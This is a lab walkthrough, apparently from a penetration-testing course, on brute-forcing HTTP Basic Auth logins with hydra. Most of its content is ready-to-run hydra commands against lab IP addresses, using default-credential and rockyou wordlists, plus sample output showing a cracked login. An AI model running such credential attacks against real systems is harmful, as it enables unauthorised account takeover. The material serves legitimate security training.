# ☄️ Basic HTTP Auth Brute Forcing

To install hydra -> "`apt install hydra -y`" or download it and use it from its [Github Repository](https://github.com/vanhauser-thc/thc-hydra)

It's good to start with lists of default passwords such as `test:test,`if we could not find any working pairs, we would move to use separate wordlists

Good lists are from seclist in the `/usr/share/seclists/Passwords/Default-Credentials`

```shell-session
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```

And the output will look something like that:

```shell-session
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://178.211.23.155:31099/
[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
[STATUS] attack finished for 178.211.23.155 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

_**Using the technique you learned in this section, try attacking the IP shown above. What are the credentials used?**_

```
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 94.237.50.83 -s 44054 http-get
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Credentials can also be separated by `usernames` and `passwords`. We can use the `-L` flag for the usernames wordlist and the `-P` flag for the passwords wordlist. Since we don't want to brute force all the usernames in combination with the passwords in the lists, we can tell `hydra` to stop after the first successful login by specifying the flag `-f`.

### Username/Password Attack

{% hint style="info" %}
"-u" flag so that it tries all users on each password and goes faster
{% endhint %}

```
 hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```

### Username Brute Force

we can brute force passwords for the `test` user by adding `-l test`

If we already found the password in the previous section, we may statically assign it with the "`-p`" flag, and only brute force for usernames that might use this password.

```shell-session
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
```
